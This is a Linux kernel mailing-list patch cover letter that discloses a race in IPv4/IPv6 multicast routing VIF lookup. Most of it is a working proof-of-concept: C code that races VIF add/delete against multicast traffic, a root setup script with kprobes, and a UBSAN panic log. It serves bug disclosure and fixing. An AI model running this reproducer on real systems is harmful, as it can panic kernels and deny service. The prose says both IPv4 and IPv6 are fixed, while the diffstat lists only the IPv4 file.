Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=74.125.82.179
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1792478627;
	b=GiJatnq3qlAFLxIyHnAA6bBQ5xG4uG7OMZh8Qk5TrVqDJAR8kfT623XCn5sf2YT93IFa
	 VkawEBNBsmU4SvUAAJLo58SYKTzlN5i91ovGLb1z5WjJdnEv9T1Ntw0tEmu744H7uf5VZ
	 amsh4ZtcqCVNOVwZ8ApAnu6KVuBHXFxUWj/nRxu7hiPgopS+q9Fep8WHQEXN5rs08gvjL
	 FWbRwKlSVglaaH01Cgc65X3RonN5nwb27JkxESTX+Hx6rVSLJyaNp/j8n07SEfFpqZr81
	 8lXj+8QBPZa615EXtmyw5ysDP6566B87JUV3PQTiqbS2ZZbMhYIfuAp2vJZQdmhg0Gg==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1792478627;
	h=DMARC-Filter:Received:DKIM-Signature:X-Google-DKIM-Signature:
	 X-Forwarded-Encrypted:X-Gm-Message-State:X-Gm-Gg:X-Received:Received:
	 From:To:Cc:Subject:Date:Message-ID:X-Mailer:MIME-Version:
	 Content-Transfer-Encoding;
	bh=DTitctE7qi4s01Ox7hpBD+uzSivhLiWLDrse+1pXAgs=;
	b=lnhthGoYv88JZA36Qdel0kTs2/lWpTc5HpX5y0u2jSVzD6N6pCFqCBSZDJv4b4Aa7fBW
	 Zhu+Hbpqmz3sC12h3IhSA0EjJLSxqbmgUdNsX08KKNnVAcTbbZgZAUwvrJ4EI6H78x6y+
	 3T0vNz7Sy2LcSCXjo4DWVWE3JeekgjWN3wIVhoDr1BkwgDBECEbl0p1ZCWPpOvW5XHc1e
	 pao0gxOVjz4Vpky1zpGPEKhp3ael3CaPKB0LvglqCzz7pk3UJP8wOmBmaioKwIAuXNmN5
	 teOQnv/MLFqbX210vwflGCzwHFjKYs9tzXsO59a5QxUWW+WB4h30bJcT00RmKnkcUkA==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=nebusec.ai;
	spf=pass smtp.mailfrom=nebusec.ai;
	dkim=pass header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=hvfxsfgk;
	arc=none smtp.remote-ip=74.125.82.179
Received: from mail-dy1-f179.google.com (mail-dy1-f179.google.com [74.125.82.179])
	(using TLSv1.3 with cipher TLS_AES_128_GCM_SHA256 (128/128 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 06903606A319
	for <netdev@vger.kernel.org>; Tue, 20 Oct 2026 06:43:46 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 06903606A319
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=nebusec.ai header.i=@nebusec.ai header.a=rsa-sha256 header.s=google header.b=hvfxsfgk
Received: by mail-dy1-f179.google.com with SMTP id 5a478bee46e88-33fb4680717so5258351eec.1
        for <netdev@vger.kernel.org>; Mon, 19 Oct 2026 23:43:46 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1792478626; x=1793083426; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=DTitctE7qi4s01Ox7hpBD+uzSivhLiWLDrse+1pXAgs=;
        b=hvfxsfgkZCIqMgrdvjb1BSTRyRSjj/J0cuv73HrvwtXC3+FsXsdlmCTv3LazbAFZo+
         +sxKOu+6JMMAw9liOn/nnYLlMMFqvMOuNJcEg+xL0D8sToU86SmhwgLhm6y/Md/IhfeJ
         92bx7ZkjAxODApUj0Tt0nq/EwCwQGnoY6YLA2AUjmBVHgiOU3MacQbGaBPLh3N/ZgEUv
         OTMqCx+CjnW8zQWhOvRKeD0fL3uP2wHJOrI+UJmUKSpDSfOaFPfBqZ0lJpst7NoN+Sir
         romhFrOfh64JQGE62uSMmc+bVQHQiCkhh7eMncsm4jhWuImQvVM3gY0PVWJma9E08InU
         pWKw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1792478626; x=1793083426;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=DTitctE7qi4s01Ox7hpBD+uzSivhLiWLDrse+1pXAgs=;
        b=mb5iFzBTeJNXDzy76atmCkGWZ7L7Cia4vPR2IAFUcdtLrstGpZSPQwFFve4GQvE3iK
         iQBk8OraBy/urP7z2Wy/v7TAfCgotitjrKyAjW3/UaPMVMg1WBoHtbZw7PAxHKCQxgEY
         1CUBo+1n7qfIpTN+NcIcz66fbDofYmIR/eIbr45n8ebOwvqw3kE0C7KqsdyROWqEYdEw
         hfT66wxI55meG/iqYrYNs0kRnN/grq3Uyy+0qNAqkcs/ToAW8NKqd85MwEZaeLkGjCZA
         hTycR1q6oxwzxPY9ElpgkMjxe5IYa2EqEokXMN9zBwgb6Iat9hjHZsvoDvHokVu9r39z
         bRKw==
X-Forwarded-Encrypted: i=1; AKwUvByYDeZ5fl2TOzNr+ztb2q4yhosf1VaT5Wk5g3WQRRu7Nn/s7eBdAswDSh0MisLbmWB5hKvSZsg=@vger.kernel.org
X-Gm-Message-State: AFq9FYJ+DHks8TZGPfMiXmWRiAs+w9+8/qC38s0FzPau4eFMXludRwTu
	+aCyHdu1LFz7pt2uTD1FIzNbff3XMMFPqJz0mCli/FsRFJE9vGz3ZLiS/8ivdIO5kIWg
X-Gm-Gg: AYBFou0Q+pP2y9C1ibNV2jEtRBhMlB18c0PHrNNRXZ3damN3LvNR8KY8cg7iO7UDyTw
	8vvlTOrFKMr7g2ZWu5sLKyAiPWPTAp7dZ4IZOOzWiWa1Qb63QEQLzBNW4ZjWZQa6pU8FFMVlTQk
	PZtJOpLN1FZS3Tbo7P3uYXuzmoULWZdpl+btsSllbFscYlOi5EziJu06BhMKTSZeSqKe/MRLbJ4
	s59szjMjanSrNsytUMjuVFE0Mw5eG8Brh5S+0fDk1NakwrIhEo9ntBXG/PXU7UlbDLCYlhmBtJf
	fNICqAqvlKWWu19gJ1Q8ewIeIAayMvj0l+rVasNWdpyrX+ojLA7P4VCS+zQ5eURebVMeRcJy9+1
	xMAS/zQZO8lvEZL05SNKSOEfUKPz2PwVmQ1LM/EGfrXlxlkQB/ewtUKYflQXy3wyRbP8Y2OWOUw
	eD23ESbWrWXAVTQfFfTWa4PevMvAGMReksf5FHuvfh2l6A+bRgglq8JXh4K7/pCeQ9RfKuoJpVt
	557Y8SOZYvijvnuTvSiXgxi8rENsOSxu65EWpyWGAf+2EdWwI84fDHSQ3XQl3hkJI4+BlE=
X-Received: by 2002:a05:693c:6395:10b0:35d:5a2c:2321 with SMTP id 5a478bee46e88-361a2348e09mr14567818eec.20.1792478625270;
        Mon, 19 Oct 2026 23:43:45 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([203.175.14.54])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-366639806a5sm1885010eec.6.2026.10.19.23.43.42
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Mon, 19 Oct 2026 23:43:44 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: idosch@nvidia.com,
	namangulati@google.com,
	netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net v2 0/1] ipmr: validate VIF indexes before offload lookup
Date: Tue, 20 Oct 2026 14:43:33 +0800
Message-ID: <cover.1792476942.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Post: <mailto:netdev@vger.kernel.org>
List-Help: <mailto:netdev+help@vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
List-Owner: <mailto:netdev+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a race in net/ipv4/ipmr.c and net/ipv6/ip6mr.c.
It is reachable by a root user configuring IPv4 multicast routing and
racing VIF updates with packet forwarding.

We will provide details of the bug below, along with the PoC and crash
log from the original report.

---- details below ----

Bug details:

During vif_add(), the VIF device pointer is published before mrt->maxvif
is increased. A concurrent packet can therefore make ipmr_find_vif()
return -1 after observing the old maxvif, even though the MFC parent
VIF's published device matches the ingress device.

In IPv4 forwarding, this race can pass the parent-device check with an
invalid ingress VIF. For (*,G) entries, that can also allow the packet
to be forwarded back out its ingress VIF. If the skb is marked for L3
forwarding offload, ipmr_forward_offloaded() can form a pointer using
in_vifi == -1 and read outside vif_table. Such a read requires the skb
to carry the offload mark, which is set by mlxsw; the race is rare. The
PoC only reproduces a UBSAN report for the negative array index, not an
actual out-of-bounds read. IPv6 has the same VIF lookup race and can
also incorrectly forward the packet.

The fix drops packets when the ingress VIF lookup fails in both IPv4
and IPv6 forwarding, before accessing the MFC parent VIF. The IPv4
offload helper also checks only for a negative in_vifi before forming
vif_table pointers; out_vifi is bounded by the MFC output-interface
iteration.

Reproducer:

    sh ./poc.sh 120

The PoC was run as root in a 2 vCPU, 2 GB x86 QEMU guest using the
provided Linux 6.12.95 build and configuration.

------BEGIN poc.c------

    #define _GNU_SOURCE

    #include <arpa/inet.h>
    #include <errno.h>
    #include <linux/mroute.h>
    #include <net/if.h>
    #include <pthread.h>
    #include <sched.h>
    #include <signal.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <sys/socket.h>
    #include <sys/sysinfo.h>
    #include <sys/types.h>
    #include <time.h>
    #include <unistd.h>

    #define GROUP_ADDR "239.1.1.1"
    #define SRC_ADDR "10.0.0.2"

    #define IN_DEV "vifin"
    #define OUT_DEV "vifout"
    #define SRC_DEV "src0"

    #define IN_VIFI 31
    #define OUT_VIFI 30
    #define UDP_PORT 5000
    #define BATCH 64

    static volatile sig_atomic_t stop_flag;
    static int mroute_fd = -1;
    static int src_ifindex;
    static int in_ifindex;
    static int out_ifindex;

    static volatile unsigned long long adds_done;
    static volatile unsigned long long dels_done;
    static void on_signal(int sig)
    {
    	(void)sig;
    	stop_flag = 1;
    }

    static void bind_to_cpu(int cpu)
    {
    	cpu_set_t set;
    	int ncpu = get_nprocs();

    	if (ncpu <= 0)
    		return;

    	CPU_ZERO(&set);
    	CPU_SET(cpu % ncpu, &set);
    	pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
    }

    static void fatal(const char *what)
    {
    	fprintf(stderr, "fatal: %s: %s\n", what, strerror(errno));
    	exit(EXIT_FAILURE);
    }

    static int vif_op(int optname, vifi_t vifi, int ifindex)
    {
    	struct vifctl vif = {
    		.vifc_vifi = vifi,
    		.vifc_flags = VIFF_USE_IFINDEX,
    		.vifc_threshold = 1,
    		.vifc_rate_limit = 0,
    		.vifc_lcl_ifindex = ifindex,
    	};

    	return setsockopt(mroute_fd, IPPROTO_IP, optname, &vif, sizeof(vif));
    }

    static void add_vif_checked(vifi_t vifi, int ifindex)
    {
    	if (vif_op(MRT_ADD_VIF, vifi, ifindex) < 0)
    		fatal("MRT_ADD_VIF");
    }

    static void del_vif_best_effort(vifi_t vifi, int ifindex)
    {
    	if (vif_op(MRT_DEL_VIF, vifi, ifindex) < 0 &&
    	    errno != EADDRNOTAVAIL)
    		fatal("MRT_DEL_VIF");
    }

    static void add_mfc_checked(void)
    {
    	struct mfcctl mfc;

    	memset(&mfc, 0, sizeof(mfc));
    	if (!inet_aton(SRC_ADDR, &mfc.mfcc_origin))
    		exit(EXIT_FAILURE);
    	if (!inet_aton(GROUP_ADDR, &mfc.mfcc_mcastgrp))
    		exit(EXIT_FAILURE);

    	mfc.mfcc_parent = IN_VIFI;
    	memset(mfc.mfcc_ttls, 255, sizeof(mfc.mfcc_ttls));
    	mfc.mfcc_ttls[OUT_VIFI] = 1;

    	if (setsockopt(mroute_fd, IPPROTO_IP, MRT_ADD_MFC, &mfc, sizeof(mfc)) < 0)
    		fatal("MRT_ADD_MFC");
    }

    static void flush_tables(void)
    {
    	int flags = MRT_FLUSH_MFC | MRT_FLUSH_MFC_STATIC |
    		    MRT_FLUSH_VIFS | MRT_FLUSH_VIFS_STATIC;

    	if (mroute_fd >= 0)
    		setsockopt(mroute_fd, IPPROTO_IP, MRT_FLUSH, &flags, sizeof(flags));
    }

    static int get_mfc_pktcnt(unsigned long *pktcnt)
    {
    	struct sioc_sg_req req;

    	memset(&req, 0, sizeof(req));
    	if (!inet_aton(SRC_ADDR, &req.src))
    		return -1;
    	if (!inet_aton(GROUP_ADDR, &req.grp))
    		return -1;
    	if (ioctl(mroute_fd, SIOCGETSGCNT, &req) < 0)
    		return -1;

    	*pktcnt = req.pktcnt;
    	return 0;
    }

    static void selftest_forwarding(void)
    {
    	unsigned long before = 0;
    	unsigned long after = 0;
    	int tries;

    	fprintf(stderr, "[*] self-test: add input VIF and verify multicast forwarding\n");
    	add_vif_checked(IN_VIFI, in_ifindex);
    	if (get_mfc_pktcnt(&before) < 0)
    		fatal("SIOCGETSGCNT(before)");

    	for (tries = 0; tries < 30; tries++) {
    		usleep(100000);
    		if (get_mfc_pktcnt(&after) < 0)
    			fatal("SIOCGETSGCNT(after)");
    		if (after > before)
    			break;
    	}
    	if (after <= before) {
    		fprintf(stderr, "fatal: self-test did not advance MFC packet counters\n");
    		exit(EXIT_FAILURE);
    	}

    	fprintf(stderr, "[+] self-test passed: MFC packets %lu -> %lu\n", before, after);
    	del_vif_best_effort(IN_VIFI, in_ifindex);
    }

    static int make_sender_socket(void)
    {
    	int fd;
    	struct sockaddr_in bind_addr = {
    		.sin_family = AF_INET,
    		.sin_port = htons(0),
    	};
    	struct ip_mreqn ifreq = { .imr_ifindex = src_ifindex };
    	unsigned char ttl = 64;

    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0)
    		fatal("socket(sender)");

    	if (!inet_aton(SRC_ADDR, &bind_addr.sin_addr))
    		exit(EXIT_FAILURE);

    	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, SRC_DEV, sizeof(SRC_DEV)) < 0)
    		fatal("SO_BINDTODEVICE(sender)");
    	if (setsockopt(fd, IPPROTO_IP, IP_MULTICAST_IF, &ifreq, sizeof(ifreq)) < 0)
    		fatal("IP_MULTICAST_IF(sender)");
    	if (setsockopt(fd, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl)) < 0)
    		fatal("IP_MULTICAST_TTL(sender)");
    	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    		fatal("bind(sender)");

    	return fd;
    }

    static int sender_main(int seconds)
    {
    	int fd = make_sender_socket();
    	struct sockaddr_in dst = {
    		.sin_family = AF_INET,
    		.sin_port = htons(UDP_PORT),
    	};
    	struct iovec iov[BATCH];
    	struct mmsghdr msgs[BATCH];
    	char payload[128];
    	int i;

    	signal(SIGINT, on_signal);
    	signal(SIGTERM, on_signal);
    	signal(SIGALRM, on_signal);
    	alarm(seconds);

    	if (!inet_aton(GROUP_ADDR, &dst.sin_addr))
    		exit(EXIT_FAILURE);

    	memset(payload, 0x42, sizeof(payload));
    	memset(msgs, 0, sizeof(msgs));
    	for (i = 0; i < BATCH; i++) {
    		iov[i].iov_base = payload;
    		iov[i].iov_len = sizeof(payload);
    		msgs[i].msg_hdr.msg_name = &dst;
    		msgs[i].msg_hdr.msg_namelen = sizeof(dst);
    		msgs[i].msg_hdr.msg_iov = &iov[i];
    		msgs[i].msg_hdr.msg_iovlen = 1;
    	}

    	while (!stop_flag) {
    		int ret = sendmmsg(fd, msgs, BATCH, 0);

    		if (ret > 0)
    			continue;
    		if (ret < 0 && (errno == EINTR || errno == ENOBUFS))
    			continue;
    		fatal("sendmmsg(sender)");
    	}

    	close(fd);
    	return EXIT_SUCCESS;
    }

    static void *toggle_thread(void *arg)
    {
    	int cpu = (int)(intptr_t)arg;

    	bind_to_cpu(cpu);
    	while (!stop_flag) {
    		if (vif_op(MRT_ADD_VIF, IN_VIFI, in_ifindex) == 0) {
    			__sync_fetch_and_add(&adds_done, 1);
    		} else if (errno != EADDRINUSE) {
    			fatal("MRT_ADD_VIF(loop)");
    		}

    		if (vif_op(MRT_DEL_VIF, IN_VIFI, in_ifindex) == 0) {
    			__sync_fetch_and_add(&dels_done, 1);
    		} else if (errno != EADDRNOTAVAIL) {
    			fatal("MRT_DEL_VIF(loop)");
    		}
    	}

    	return NULL;
    }

    static int race_main(int seconds)
    {
    	int mrt_init = 1;
    	pthread_t toggler;
    	time_t start;

    	signal(SIGINT, on_signal);
    	signal(SIGTERM, on_signal);
    	signal(SIGALRM, on_signal);

    	in_ifindex = if_nametoindex(IN_DEV);
    	out_ifindex = if_nametoindex(OUT_DEV);
    	if (!in_ifindex || !out_ifindex) {
    		fprintf(stderr, "fatal: missing expected interfaces (%s, %s)\n",
    			IN_DEV, OUT_DEV);
    		return EXIT_FAILURE;
    	}

    	mroute_fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
    	if (mroute_fd < 0)
    		fatal("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");
    	if (setsockopt(mroute_fd, IPPROTO_IP, MRT_INIT, &mrt_init, sizeof(mrt_init)) < 0)
    		fatal("MRT_INIT");

    	flush_tables();
    	add_vif_checked(OUT_VIFI, out_ifindex);
    	add_mfc_checked();
    	selftest_forwarding();

    	fprintf(stderr, "[*] racing VIF publication against multicast ingress for up to %d seconds\n",
    		seconds);
    	alarm(seconds);
    	start = time(NULL);

    	if (pthread_create(&toggler, NULL, toggle_thread, (void *)(intptr_t)0) != 0)
    		fatal("pthread_create(toggler)");

    	while (!stop_flag) {
    		unsigned long pktcnt = 0;

    		sleep(1);
    		if (get_mfc_pktcnt(&pktcnt) < 0)
    			pktcnt = 0;
    		fprintf(stderr,
    			"[*] %lds mfc_pktcnt=%lu add=%llu del=%llu\n",
    			(long)(time(NULL) - start),
    			pktcnt, adds_done, dels_done);
    	}

    	fprintf(stderr, "[*] stopping without observed crash\n");
    	pthread_join(toggler, NULL);

    	flush_tables();
    	setsockopt(mroute_fd, IPPROTO_IP, MRT_DONE, &mrt_init, sizeof(mrt_init));
    	close(mroute_fd);
    	return EXIT_SUCCESS;
    }

    int main(int argc, char **argv)
    {
    	int seconds = 300;

    	if (argc > 2)
    		seconds = atoi(argv[2]);
    	else if (argc > 1 && strcmp(argv[1], "sender") != 0)
    		seconds = atoi(argv[1]);
    	if (seconds <= 0)
    		seconds = 300;

    	src_ifindex = if_nametoindex(SRC_DEV);
    	in_ifindex = if_nametoindex(IN_DEV);
    	out_ifindex = if_nametoindex(OUT_DEV);

    	if (argc > 1 && strcmp(argv[1], "sender") == 0) {
    		src_ifindex = if_nametoindex(SRC_DEV);
    		if (!src_ifindex) {
    			fprintf(stderr, "fatal: missing sender interface %s\n", SRC_DEV);
    			return EXIT_FAILURE;
    		}
    		return sender_main(seconds);
    	}

    	if (!in_ifindex || !out_ifindex) {
    		fprintf(stderr, "fatal: missing expected interfaces (%s, %s)\n",
    			IN_DEV, OUT_DEV);
    		return EXIT_FAILURE;
    	}

    	return race_main(seconds);
    }

------END poc.c--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    cd "$(dirname "$0")"

    cleanup() {
    	if [ -e /sys/kernel/debug/tracing/events/kprobes/enable ]; then
    		echo 0 >/sys/kernel/debug/tracing/events/kprobes/enable
    	fi
    	if [ -e /sys/kernel/debug/tracing/kprobe_events ]; then
    		echo '-:ipmr_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    		echo '-:ipmr_find_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    	fi
    	ip netns del ns_src 2>/dev/null || true
    	ip link del vifin 2>/dev/null || true
    	ip link del vifout 2>/dev/null || true
    }

    trap cleanup EXIT
    cleanup

    ip link add vifin type veth peer name src0
    ip link add vifout type veth peer name sink0

    ip netns add ns_src
    ip link set src0 netns ns_src

    ip addr add 10.0.0.1/24 dev vifin
    ip addr add 10.0.1.1/24 dev vifout
    ip addr add 10.0.1.2/24 dev sink0

    ip link set vifin up
    ip link set vifout up
    ip link set sink0 up

    ip -n ns_src addr add 10.0.0.2/24 dev src0
    ip -n ns_src link set lo up
    ip -n ns_src link set src0 up

    sysctl -q -w net.ipv4.ip_forward=1
    sysctl -q -w net.ipv4.conf.all.rp_filter=0
    sysctl -q -w net.ipv4.conf.default.rp_filter=0
    sysctl -q -w net.ipv4.conf.vifin.rp_filter=0
    sysctl -q -w net.ipv4.conf.vifout.rp_filter=0
    sysctl -q -w net.ipv4.conf.sink0.rp_filter=0

    mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
    echo '-:ipmr_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    echo '-:ipmr_find_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    echo 'p:ipmr_hold vif_add+0x496' >/sys/kernel/debug/tracing/kprobe_events
    echo 'p:ipmr_find_hold ip_mr_forward+0x35' >/sys/kernel/debug/tracing/kprobe_events
    echo 1 >/sys/kernel/debug/tracing/events/kprobes/enable

    make clean >/dev/null 2>&1 || true
    make

    duration="${1:-300}"
    taskset -c 1 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.1.log 2>&1 &
    pid1=$!
    taskset -c 2 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.2.log 2>&1 &
    pid2=$!
    taskset -c 3 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.3.log 2>&1 &
    pid3=$!

    trap 'kill "$pid1" "$pid2" "$pid3" 2>/dev/null || true; cleanup' EXIT
    exec ./poc race "$duration"

------END poc.sh--------

----BEGIN crash log----

[   67.164888] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
[   67.165410] CPU: 1 UID: 0 PID: 1016 Comm: poc Not tainted 6.12.95 #1
[   67.165883] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   67.166689] Call Trace:
[   67.166867]  <IRQ>
[   67.167077]  panic+0x352/0x3e0
[   67.167313]  ? _printk+0x64/0x80
[   67.167614]  check_panic_on_warn+0x44/0x60
[   67.168007]  __ubsan_handle_out_of_bounds+0xe7/0x100
[   67.168452]  ipmr_queue_xmit+0x6e1/0x730
[   67.168907]  ip_mr_input+0xf3/0x460
[   67.169450]  __netif_receive_skb_one_core+0x89/0xa0
[   67.170312]  process_backlog+0x99/0x1b0
[   67.171034]  __napi_poll+0x28/0x1b0
[   67.171564]  net_rx_action+0x197/0x370
[   67.172145]  handle_softirqs+0xe6/0x300
[   67.172723]  do_softirq.part.0+0x3b/0x60
[   67.173412]  </IRQ>
[   67.173733]  <TASK>
[   67.174200]  __local_bh_enable_ip+0x4f/0x60
[   67.174989]  __dev_queue_xmit+0x372/0xe60
[   67.175487]  ? ip_generic_getfrag+0x63/0xf0
[   67.176028]  ? srso_alias_return_thunk+0x5/0xfbef5
[   67.176746]  ? __ip_append_data+0xc9b/0x13a0
[   67.177601]  ? __pfx_ip_generic_getfrag+0x10/0x10
[   67.178369]  ip_finish_output2+0x268/0x540
[   67.179085]  ip_output+0x5d/0xe0
[   67.179702]  ? __pfx_ip_finish_output+0x10/0x10
[   67.180402]  ip_send_skb+0x86/0x90
[   67.180960]  udp_send_skb+0x18e/0x360
[   67.181678]  udp_sendmsg+0xb31/0xe40
[   67.182282]  ? __pfx_ip_generic_getfrag+0x10/0x10
[   67.182854]  ? ____sys_sendmsg+0x2e8/0x310
[   67.183361]  ____sys_sendmsg+0x2e8/0x310
[   67.183856]  ? copy_msghdr_from_user+0x7d/0xc0
[   67.184574]  ___sys_sendmsg+0x9a/0xe0
[   67.185177]  ? __schedule+0x47e/0x1450
[   67.185749]  __sys_sendmmsg+0xfa/0x210
[   67.186323]  __x64_sys_sendmmsg+0x21/0x30
[   67.187067]  do_syscall_64+0x58/0x120
[   67.187630]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   67.188274] RIP: 0033:0x7f22ef597687
[   67.188698] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[   67.191292] RSP: 002b:00007ffc261b1d80 EFLAGS: 00000202 ORIG_RAX: 0000000000000133
[   67.192314] RAX: ffffffffffffffda RBX: 00007f22ef505740 RCX: 00007f22ef597687
[   67.193303] RDX: 0000000000000040 RSI: 00007ffc261b2260 RDI: 0000000000000003
[   67.194295] RBP: 00007ffc261b1de0 R08: 0000000000000000 R09: 0000000000000000
[   67.195124] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000003
[   67.195990] R13: 00007ffc261b2260 R14: 0000000000000078 R15: 000057fc757db880
[   67.197089]  </TASK>
[   67.198132] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipmr: validate VIF indexes before offload lookup

 net/ipv4/ipmr.c | 9 +++++++--
 1 file changed, 7 insertions(+), 2 deletions(-)

-- 
2.55.0

